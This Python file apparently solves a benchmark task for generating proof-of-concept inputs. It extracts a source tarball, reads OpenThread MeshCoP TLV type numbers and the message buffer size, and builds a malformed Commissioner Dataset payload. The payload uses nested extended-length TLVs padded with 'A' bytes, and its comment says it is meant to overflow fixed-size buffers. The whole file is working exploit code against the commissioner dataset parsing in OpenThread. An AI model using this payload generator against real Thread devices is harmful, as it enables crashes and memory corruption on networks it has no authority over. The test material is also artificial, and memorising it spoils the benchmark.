import os
import re
import tarfile
import tempfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        extract_dir = tempfile.mkdtemp(prefix="pocgen_")
        try:
            with tarfile.open(src_path, "r:*") as tf:
                tf.extractall(extract_dir)
        except Exception:
            # Fallback PoC if extraction fails for some reason
            return b"A" * 844

        tlv_types = self._parse_meshcop_tlv_types(extract_dir)
        if not tlv_types:
            # If we couldn't find any TLV type definitions, return a generic payload
            return b"A" * 844

        msg_buf_size = self._parse_message_buffer_size(extract_dir)
        if msg_buf_size is None:
            msg_buf_size = 1280

        payload = self._build_poc_payload(tlv_types, msg_buf_size)
        return bytes(payload)

    def _iter_source_files(self, root_dir):
        for dirpath, _, filenames in os.walk(root_dir):
            for fn in filenames:
                if fn.endswith((".h", ".hpp", ".c", ".cc", ".cpp")):
                    yield os.path.join(dirpath, fn)

    def _parse_meshcop_tlv_types(self, root_dir):
        tlv_types = {}
        pattern = re.compile(r"#define\s+OT_MESHCOP_TLV_([A-Z0-9_]+)\s+(\d+)")
        for path in self._iter_source_files(root_dir):
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    text = f.read()
            except Exception:
                continue
            for m in pattern.finditer(text):
                name = m.group(1)
                try:
                    val = int(m.group(2))
                except ValueError:
                    continue
                if 0 <= val <= 255:
                    tlv_types[name] = val
        return tlv_types

    def _parse_message_buffer_size(self, root_dir):
        pattern = re.compile(r"#define\s+OPENTHREAD_CONFIG_MESSAGE_BUFFER_SIZE\s+(\d+)")
        found = []
        for path in self._iter_source_files(root_dir):
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    text = f.read()
            except Exception:
                continue
            for m in pattern.finditer(text):
                try:
                    val = int(m.group(1))
                except ValueError:
                    continue
                if val > 0:
                    found.append(val)
        if not found:
            return None
        return min(found)

    def _find_type_by_keywords(self, tlv_types, include_keywords, exclude_keywords=None):
        if exclude_keywords is None:
            exclude_keywords = []
        include_keywords = [kw.upper() for kw in include_keywords]
        exclude_keywords = [kw.upper() for kw in exclude_keywords]

        best_name = None
        best_val = None
        for name, val in tlv_types.items():
            upper_name = name.upper()
            if any(ex_kw in upper_name for ex_kw in exclude_keywords):
                continue
            if all(kw in upper_name for kw in include_keywords):
                # Prefer the lowest numeric value to have deterministic choice
                if best_val is None or val < best_val:
                    best_val = val
                    best_name = name
        return best_name, best_val

    def _select_nested_types(self, tlv_types, dataset_type_val, session_type_val, max_types):
        selected = []

        # Priority-based selection using common commissioner dataset TLV names
        priority_keywords = [
            ["STEERING", "DATA"],
            ["COMMISSIONER", "ID"],
            ["PROVISIONING", "URL"],
            ["BORDER", "AGENT", "LOCATOR"],
            ["NETWORK", "NAME"],
            ["PSKC"],
            ["NETWORK", "MASTER", "KEY"],
            ["MESH", "LOCAL", "PREFIX"],
        ]

        used_vals = set()
        for keywords in priority_keywords:
            name, val = self._find_type_by_keywords(
                tlv_types,
                include_keywords=keywords,
                exclude_keywords=["DATASET"]
            )
            if name is None:
                continue
            if val in (dataset_type_val, session_type_val):
                continue
            if val in used_vals:
                continue
            used_vals.add(val)
            selected.append(val)
            if len(selected) >= max_types:
                return selected

        # Fallback: pick by smallest numeric value, excluding dataset/session
        if len(selected) < max_types:
            for name, val in sorted(tlv_types.items(), key=lambda kv: kv[1]):
                if val in (dataset_type_val, session_type_val):
                    continue
                if val in used_vals:
                    continue
                used_vals.add(val)
                selected.append(val)
                if len(selected) >= max_types:
                    break

        return selected

    def _make_extended_tlv(self, tlv_type, length, value_byte):
        tlv = bytearray()
        tlv.append(tlv_type & 0xFF)
        tlv.append(0xFF)  # extended length indicator
        tlv.append((length >> 8) & 0xFF)
        tlv.append(length & 0xFF)
        tlv.extend([value_byte] * length)
        return tlv

    def _make_non_extended_tlv(self, tlv_type, value_bytes):
        tlv = bytearray()
        tlv.append(tlv_type & 0xFF)
        tlv.append(len(value_bytes) & 0xFF)
        tlv.extend(value_bytes)
        return tlv

    def _build_simple_poc(self, tlv_types, msg_buf_size, session_type_val):
        # Simple fallback: a sequence of extended-length TLVs directly in the payload
        payload = bytearray()

        # Choose up to 5 TLV types (excluding session, if known)
        chosen = []
        for name, val in sorted(tlv_types.items(), key=lambda kv: kv[1]):
            if val == session_type_val:
                continue
            chosen.append(val)
            if len(chosen) >= 5:
                break

        if not chosen:
            return b"A" * 844

        num_tlvs = len(chosen)
        usable = max(msg_buf_size - 64, 256)
        base_overhead = 0
        max_for_each = (usable - base_overhead) // num_tlvs
        ext_len = max_for_each - 4
        if ext_len < 32:
            ext_len = 32
        if ext_len > 512:
            ext_len = 512

        if session_type_val is not None:
            # Add a small valid session ID TLV first
            payload.extend(self._make_non_extended_tlv(session_type_val, b"\x12\x34"))

        for t in chosen:
            payload.extend(self._make_extended_tlv(t, ext_len, 0x41))

        return payload

    def _build_poc_payload(self, tlv_types, msg_buf_size):
        # Try to use full commissioner dataset structure
        dataset_name, dataset_type_val = self._find_type_by_keywords(
            tlv_types, include_keywords=["COMMISSIONER", "DATASET"]
        )

        session_name, session_type_val = self._find_type_by_keywords(
            tlv_types, include_keywords=["SESSION", "ID"]
        )

        if dataset_type_val is None:
            # No commissioner dataset TLV type found; fallback to simpler PoC
            return self._build_simple_poc(tlv_types, msg_buf_size, session_type_val)

        # Select nested TLV types inside the Commissioner Dataset
        nested_types = self._select_nested_types(
            tlv_types, dataset_type_val, session_type_val, max_types=3
        )
        if not nested_types:
            # If we couldn't find nested candidates, fallback
            return self._build_simple_poc(tlv_types, msg_buf_size, session_type_val)

        # Compute a safe extended length per nested TLV
        usable = max(msg_buf_size - 64, 256)
        num_nested = len(nested_types)
        base_overhead = 4  # commissioner dataset TLV header worst-case (extended)
        if session_type_val is not None:
            base_overhead += 4  # session TLV header + 2-byte value (approx)

        max_for_each = (usable - base_overhead) // num_nested
        ext_len = max_for_each - 4  # subtract TLV header
        if ext_len > 300:
            ext_len = 300
        if ext_len < 80:
            # Try to keep it reasonably large to overflow typical fixed-size buffers
            ext_len = max(32, ext_len)

        # Build nested TLVs inside the Commissioner Dataset
        nested_value = bytearray()
        for t in nested_types:
            nested_value.extend(self._make_extended_tlv(t, ext_len, 0x41))

        dataset_len = len(nested_value)

        # Build top-level Commissioner Dataset TLV
        dataset_tlv = bytearray()
        dataset_tlv.append(dataset_type_val & 0xFF)
        if dataset_len < 255:
            dataset_tlv.append(dataset_len & 0xFF)
        else:
            dataset_tlv.append(0xFF)
            dataset_tlv.append((dataset_len >> 8) & 0xFF)
            dataset_tlv.append(dataset_len & 0xFF)
        dataset_tlv.extend(nested_value)

        # Build final payload: Session ID TLV (normal) + Commissioner Dataset TLV
        payload = bytearray()

        if session_type_val is not None:
            session_value = b"\x12\x34"
            payload.extend(self._make_non_extended_tlv(session_type_val, session_value))

        payload.extend(dataset_tlv)

        # Ensure payload is not empty; as a last resort, add filler
        if not payload:
            payload = bytearray(b"A" * 844)

        return payload